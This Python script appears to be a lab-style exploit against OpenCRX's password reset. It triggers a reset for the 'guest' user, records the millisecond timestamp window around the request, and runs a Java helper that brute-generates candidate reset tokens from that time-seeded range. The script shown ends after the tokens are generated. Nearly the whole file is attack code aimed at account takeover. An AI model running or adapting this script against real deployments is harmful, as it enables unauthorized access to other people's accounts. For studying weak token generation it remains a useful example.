import sys, re, os
import requests
import subprocess
import base64
import json
import time
requests.packages.urllib3.disable_warnings()

def current_milli_time():
	return int(time.time() * 1000)

def requestResetPassword(ip, username):
	target = f"http://{ip}:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
	data = {
		'id': username
	}

	r = requests.post(target, data=data)
	# print(r.text)
	if "Password reset request successful" not in r.text:
		print("Password reset unsuccessful")
		exit(0)

	print(f"Password reset successfully for user {username}")

# Uses java to generate list of tokens
def gen_tokens(low, high):
	cmd = f"java OpenCRXToken {low} {high}"
	proc = subprocess.run(cmd, shell=True, capture_output=True)
	output = proc.stdout.decode()
	tokens = output.split('\n')

	tokens = [token for token in tokens if len(token) == 40]
	return tokens

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]

	low = current_milli_time()
	requestResetPassword(ip, "guest")
	high = current_milli_time()
	print(f"Timestamp seed range: {{{low} - {high}}}")

	tokens = gen_tokens(low, high)

if __name__ == '__main__':
	main()